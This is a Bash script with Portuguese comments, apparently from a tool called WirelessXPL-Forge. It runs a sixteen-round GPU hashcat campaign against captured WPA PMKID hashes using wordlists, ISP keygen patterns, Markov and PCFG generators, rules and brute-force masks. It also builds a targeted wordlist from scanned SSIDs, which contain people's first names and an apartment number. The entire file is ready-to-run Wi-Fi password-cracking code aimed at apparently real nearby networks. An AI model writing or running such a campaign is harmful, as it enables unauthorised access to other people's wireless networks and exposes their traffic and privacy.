#!/usr/bin/env bash
# crack_session.sh — Sessão completa de crack WPA via GPU RTX 4060
# Usa: PMKIDs capturados, WordListsForHacking, SecLists, máscaras BR
# Ordem crescente de esforço: rápido → abrangente

set -uo pipefail

HASHES="/tmp/pmkid_hashes.txt"
WL_BASE="/mnt/d/Projetos-SafeLabs/submodules/Wordlists"
WFH="$WL_BASE/WordListsForHacking/wfh.py"
OUT="/tmp/wxf_crack_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

HC="hashcat"
HC_OPTS="--force --status --status-timer=10 -O"
CUDA="LD_LIBRARY_PATH=/usr/lib/wsl/lib"
RULES_DIR="/usr/share/hashcat/rules"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'; NC='\033[0m'
ok()   { echo -e "${GRN}[CRACKED]${NC} $*"; }
info() { echo -e "${CYN}[*]${NC} $*"; }
warn() { echo -e "${YLW}[>]${NC} $*"; }

check_cracked() {
    local session="$1"
    local show
    show=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null")
    if [ -n "$show" ]; then
        ok "SENHA ENCONTRADA na sessão '$session'!"
        echo "$show"
        echo "$show" >> "$OUT/CRACKED_RESULTS.txt"
        return 0
    fi
    return 1
}

show_speed() {
    info "GPU: $(nvidia-smi --query-gpu=name,temperature.gpu,utilization.gpu --format=csv,noheader,nounits 2>/dev/null)"
}

echo "================================================================"
echo "  WirelessXPL-Forge — Sessão Completa de Crack GPU RTX 4060"
echo "  Hashes: $HASHES"
echo "  Output: $OUT"
echo "  Início: $(date)"
echo "================================================================"
echo ""

# Verificar hashes disponíveis
info "Hashes alvo:"
cat "$HASHES" | while IFS='*' read -r type _ _ _ ap_mac sta_mac ssid_hex _; do
    ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
    echo "  [$type] SSID: $ssid  AP: $ap_mac"
done
echo ""

# ═══════════════════════════════════════════════════════════════
# RODADA 1 — WiFi-WPA específico (SecLists — mais prováveis)
# ═══════════════════════════════════════════════════════════════
info "RODADA 1 — SecLists WiFi-WPA probable passwords (4.800 entradas)"
eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    $WL_BASE/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
    --session r1_seclists_wifi 2>&1" | grep -E "Recovered|Speed|Progress|Candidates|STATUS" | head -10
check_cracked "SecLists-WiFi-WPA" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 2 — Default credentials BR (IoT/Routers)
# ═══════════════════════════════════════════════════════════════
info "RODADA 2 — Default credentials IoT/Routers BR"
eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    $WL_BASE/WordListsForHacking/passwords/default-creds-combo.lst \
    --session r2_default_creds 2>&1" | grep -E "Recovered|Speed|Progress" | head -10
check_cracked "DefaultCreds" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 3 — wlist_brasil.lst (55MB — senhas BR específicas)
# ═══════════════════════════════════════════════════════════════
info "RODADA 3 — wlist_brasil.lst (55MB — wordlist brasileira)"
show_speed
eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    $WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst \
    --session r3_brasil 2>&1" | grep -E "Recovered|Speed|Progress|Exhausted|STATUS" | head -15
check_cracked "wlist_brasil" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 4 — WFH ISP keygen (padrão ISP — NET_2G é Claro/NET)
# ═══════════════════════════════════════════════════════════════
info "RODADA 4 — ISP keygen (padrão de roteadores Claro/NET/Vivo)"

# Gerar wordlist ISP
ISP_WL="$OUT/isp_keygen.lst"
if [ ! -f "$ISP_WL" ]; then
    info "  Gerando via WFH isp-keygen (limite 500k)..."
    python3 "$WFH" isp-keygen \
        --isp xfinity_comcast \
        --direction both \
        --limit 500000 \
        -o "$ISP_WL" 2>/dev/null
    info "  Gerado: $(wc -l < "$ISP_WL" 2>/dev/null) entradas"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$ISP_WL" \
    --session r4_isp 2>&1" | grep -E "Recovered|Speed|Progress" | head -10
check_cracked "ISP-keygen" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 5 — WFH Markov (modelo treinado em wlist_brasil + rockyou)
# ═══════════════════════════════════════════════════════════════
info "RODADA 5 — Markov chain (treinado em wlist_brasil + WiFi-WPA)"
MARKOV_MODEL="$OUT/markov_model.pkl"
MARKOV_WL="$OUT/markov_candidates.lst"

if [ ! -f "$MARKOV_WL" ]; then
    info "  Treinando modelo Markov..."
    python3 "$WFH" markov train \
        --wordlist \
            "$WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst" \
            "$WL_BASE/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" \
            "/tmp/rockyou.txt" \
        --model-output "$MARKOV_MODEL" \
        --order 3 \
        --max-lines 500000 2>/dev/null

    info "  Gerando candidatos Markov (500k, 8-20 chars)..."
    python3 "$WFH" markov generate \
        --model "$MARKOV_MODEL" \
        --min-len 8 \
        --max-len 20 \
        --limit 500000 \
        -o "$MARKOV_WL" 2>/dev/null
    info "  Gerado: $(wc -l < "$MARKOV_WL" 2>/dev/null) candidatos"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$MARKOV_WL" \
    --session r5_markov 2>&1" | grep -E "Recovered|Speed|Progress" | head -10
check_cracked "Markov" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 6 — WFH PCFG (probabilistic grammar)
# ═══════════════════════════════════════════════════════════════
info "RODADA 6 — PCFG probabilistic grammar"
PCFG_MODEL="$OUT/pcfg_model.pkl"
PCFG_WL="$OUT/pcfg_candidates.lst"

if [ ! -f "$PCFG_WL" ]; then
    info "  Treinando PCFG..."
    python3 "$WFH" pcfg train \
        --wordlist \
            "$WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst" \
            "$WL_BASE/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" \
        --model-output "$PCFG_MODEL" \
        --max-lines 300000 2>/dev/null

    info "  Gerando candidatos PCFG (300k)..."
    python3 "$WFH" pcfg generate \
        --model "$PCFG_MODEL" \
        --min-len 8 --max-len 20 \
        --limit 300000 \
        -o "$PCFG_WL" 2>/dev/null
    info "  Gerado: $(wc -l < "$PCFG_WL" 2>/dev/null) candidatos"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$PCFG_WL" \
    --session r6_pcfg 2>&1" | grep -E "Recovered|Speed|Progress" | head -10
check_cracked "PCFG" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 7 — WFH rulegen + rockyou (regras automáticas)
# ═══════════════════════════════════════════════════════════════
info "RODADA 7 — Regras hashcat geradas via WFH rulegen"
CUSTOM_RULES="$OUT/wfh_rules.rule"

if [ ! -f "$CUSTOM_RULES" ]; then
    info "  Gerando regras hashcat a partir de wlist_brasil..."
    python3 "$WFH" rulegen \
        --wordlist "$WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst" \
        --max-lines 200000 \
        --top-rules 200 \
        -o "$CUSTOM_RULES" 2>/dev/null
    info "  Regras geradas: $(wc -l < "$CUSTOM_RULES" 2>/dev/null)"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    /tmp/rockyou.txt \
    -r "$CUSTOM_RULES" \
    --session r7_rulegen 2>&1" | grep -E "Recovered|Speed|Progress" | head -10
check_cracked "WFH-rulegen" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 8 — rockyou + regras hashcat conhecidas
# ═══════════════════════════════════════════════════════════════
info "RODADA 8 — rockyou + best64.rule + d3ad0ne.rule"

for rule in best64 d3ad0ne; do
    RULE_FILE="$RULES_DIR/$rule.rule"
    [ -f "$RULE_FILE" ] || continue
    info "  Testando com $rule.rule..."
    eval "$CUDA $HC -m 22000 $HC_OPTS \
        $HASHES \
        /tmp/rockyou.txt \
        -r "$RULE_FILE" \
        --session r8_${rule} 2>&1" | grep -E "Recovered|Speed|Progress|Exhausted" | head -8
    check_cracked "rockyou+$rule" && exit 0
done

# ═══════════════════════════════════════════════════════════════
# RODADA 9 — wlist_brasil + regras conhecidas
# ═══════════════════════════════════════════════════════════════
info "RODADA 9 — wlist_brasil + best64.rule"
RULE_FILE="$RULES_DIR/best64.rule"
if [ -f "$RULE_FILE" ]; then
    eval "$CUDA $HC -m 22000 $HC_OPTS \
        $HASHES \
        $WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst \
        -r "$RULE_FILE" \
        --session r9_brasil_rules 2>&1" | grep -E "Recovered|Speed|Progress|Exhausted" | head -8
    check_cracked "wlist_brasil+best64" && exit 0
fi

# ═══════════════════════════════════════════════════════════════
# RODADA 10 — Máscaras BR (padrões numéricos brasileiros)
# ═══════════════════════════════════════════════════════════════
info "RODADA 10 — Máscaras numéricas brasileiras (GPU brute force)"
show_speed

MASKS=(
    "?d?d?d?d?d?d?d?d"                    # 8 dígitos (mais comum BR)
    "?d?d?d?d?d?d?d?d?d"                   # 9 dígitos
    "?d?d?d?d?d?d?d?d?d?d"                 # 10 dígitos (telefone)
    "?d?d?d?d?d?d?d?d?d?d?d"               # 11 dígitos (cel com DDD)
)

for mask in "${MASKS[@]}"; do
    info "  Máscara: $mask"
    eval "$CUDA $HC -m 22000 $HC_OPTS \
        $HASHES \
        -a 3 '$mask' \
        --session mask_$(echo $mask | tr -cd 'd' | wc -c)d 2>&1" | \
        grep -E "Recovered|Speed|Progress|Exhausted" | head -5
    check_cracked "mask:$mask" && exit 0
done

# ═══════════════════════════════════════════════════════════════
# RODADA 11 — WFH kwalk (keyboard walks - senhas comuns)
# ═══════════════════════════════════════════════════════════════
info "RODADA 11 — Keyboard walk (qwerty, 123, etc.)"
KWALK_WL="$OUT/kwalk.lst"

if [ ! -f "$KWALK_WL" ]; then
    python3 "$WFH" kwalk \
        --min-len 8 --max-len 12 \
        --limit 100000 \
        -o "$KWALK_WL" 2>/dev/null
    info "  kwalk: $(wc -l < "$KWALK_WL" 2>/dev/null) entradas"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$KWALK_WL" \
    --session r11_kwalk 2>&1" | grep -E "Recovered|Speed|Progress" | head -8
check_cracked "kwalk" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 12 — WFH PRINCE (combinações de palavras curtas)
# ═══════════════════════════════════════════════════════════════
info "RODADA 12 — PRINCE combinatorial (palavras do wlist_brasil)"
PRINCE_WL="$OUT/prince_candidates.lst"

if [ ! -f "$PRINCE_WL" ]; then
    python3 "$WFH" prince \
        --wordlist "$WL_BASE/WordListsForHacking/passwords/wlist_brasil.lst" \
        --min-len 8 --max-len 16 \
        --limit 300000 \
        -o "$PRINCE_WL" 2>/dev/null
    info "  PRINCE: $(wc -l < "$PRINCE_WL" 2>/dev/null) candidatos"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$PRINCE_WL" \
    --session r12_prince 2>&1" | grep -E "Recovered|Speed|Progress" | head -8
check_cracked "PRINCE" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 13 — WFH mangle (leet speak + variações)
# ═══════════════════════════════════════════════════════════════
info "RODADA 13 — Mangle leet speak + reversão + substituições"
MANGLE_WL="$OUT/mangle_candidates.lst"

if [ ! -f "$MANGLE_WL" ]; then
    python3 "$WFH" mangle \
        --wordlist "$WL_BASE/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" \
        --limit 100000 \
        -o "$MANGLE_WL" 2>/dev/null
    info "  Mangle: $(wc -l < "$MANGLE_WL" 2>/dev/null) variantes"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$MANGLE_WL" \
    --session r13_mangle 2>&1" | grep -E "Recovered|Speed|Progress" | head -8
check_cracked "mangle" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 14 — Perfil SSID-based (nomes nos SSIDs detectados)
# ═══════════════════════════════════════════════════════════════
info "RODADA 14 — Perfil target SSID-based (nomes detectados)"
SSID_WL="$OUT/ssid_profile.lst"

if [ ! -f "$SSID_WL" ]; then
    info "  Gerando perfil baseado nos SSIDs detectados..."
    # Palavras extraídas dos SSIDs detectados no scan
    SSID_WORDS="UNIAOGEEK UniaGeek uniaoegeek UniaoGeek1 UniaoGeek123
APT1104 APT 1104 apt1104 apartamento
Ricardo ricardo Ricardo123 ricardo123
Denise denise Denise123 denise123
LICHTHOUSE lighthouselab lighthouse
Jefferson jefferson jeff
MERCUSYS mercusys
TrOll troll TrOll123
MAURI mauri Mauri123
THOR thor Thor123
JOAQUIM joaquim Joaquim123
Teixeira teixeira
PEDRA_AZUL pedrazul
VIVO vivo vivo123 vivo2024 vivo2025
CLARO claro claro123 claro2024
NET net123 netbrasil"
    echo "$SSID_WORDS" | tr ' ' '\n' | sort -u > "$SSID_WL"

    # WFH profile para UNIAOGEEK
    python3 "$WFH" profile \
        --name "UniaoGeek" \
        --keywords "uniao geek wifi internet rede" \
        --years "2020 2021 2022 2023 2024 2025 2026" \
        --min-len 8 \
        -o - 2>/dev/null >> "$SSID_WL"

    sort -u "$SSID_WL" -o "$SSID_WL"
    info "  Perfil: $(wc -l < "$SSID_WL") entradas"
fi

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    "$SSID_WL" \
    --session r14_ssid_profile 2>&1" | grep -E "Recovered|Speed|Progress" | head -8
check_cracked "SSID-profile" && exit 0

# ═══════════════════════════════════════════════════════════════
# RODADA 15 — SSID profile + rules (combinação poderosa)
# ═══════════════════════════════════════════════════════════════
info "RODADA 15 — SSID profile + best64 + d3ad0ne rules combinados"
for rule in best64 d3ad0ne toggles1; do
    RULE_FILE="$RULES_DIR/$rule.rule"
    [ -f "$RULE_FILE" ] || continue
    eval "$CUDA $HC -m 22000 $HC_OPTS \
        $HASHES \
        "$SSID_WL" \
        -r "$RULE_FILE" \
        --session r15_ssid_$rule 2>&1" | grep -E "Recovered|Speed|Progress" | head -5
    check_cracked "ssid+$rule" && exit 0
done

# ═══════════════════════════════════════════════════════════════
# RODADA 16 — Máscara alfanumérica padrão WiFi (8 chars)
# ═══════════════════════════════════════════════════════════════
info "RODADA 16 — Máscara ?a×8 (alfanumério 8 chars — padrão WiFi)"
info "  ATENÇÃO: Estimativa ~95 bilhões combinações. GPU vai levar horas."
info "  Executando por 30 min com checkpoint..."

eval "$CUDA $HC -m 22000 $HC_OPTS \
    $HASHES \
    -a 3 '?l?l?l?l?d?d?d?d' \
    --session r16_lower4digit4 \
    --runtime 1800 2>&1" | grep -E "Recovered|Speed|Progress|Exhausted|Paused" | head -10
check_cracked "lower+4digit" && exit 0

# ═══════════════════════════════════════════════════════════════
# RELATÓRIO FINAL
# ═══════════════════════════════════════════════════════════════
echo ""
echo "================================================================"
echo "  SESSÃO DE CRACK CONCLUÍDA — $(date)"
echo "================================================================"

CRACKED=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null")
if [ -n "$CRACKED" ]; then
    ok "SENHAS ENCONTRADAS:"
    echo "$CRACKED"
    echo "$CRACKED" | tee "$OUT/CRACKED_RESULTS.txt"
else
    warn "Nenhuma senha encontrada nas 16 rodadas."
    echo ""
    warn "Wordlists testadas:"
    echo "  1. SecLists WiFi-WPA (4.800 senhas WiFi prováveis)"
    echo "  2. Default creds IoT/Routers BR"
    echo "  3. wlist_brasil (55MB — wordlist brasileira)"
    echo "  4. ISP keygen (500k padrões ISP)"
    echo "  5. Markov (treinado em wlist_brasil + WiFi-WPA)"
    echo "  6. PCFG probabilistic grammar"
    echo "  7. WFH rulegen + rockyou"
    echo "  8. rockyou + best64 + d3ad0ne rules"
    echo "  9. wlist_brasil + best64"
    echo " 10. Máscaras numéricas BR (8-11 dígitos)"
    echo " 11. Keyboard walks"
    echo " 12. PRINCE combinatorial"
    echo " 13. Mangle leet speak"
    echo " 14. SSID profile (nomes dos APs detectados)"
    echo " 15. SSID profile + regras"
    echo " 16. Máscara ?l×4+?d×4 (30 min)"
    echo ""
    warn "Conclusão: Senhas são robustas ou exigem wordlist mais específica."
fi

echo ""
echo "Arquivos em $OUT/"
ls "$OUT/"
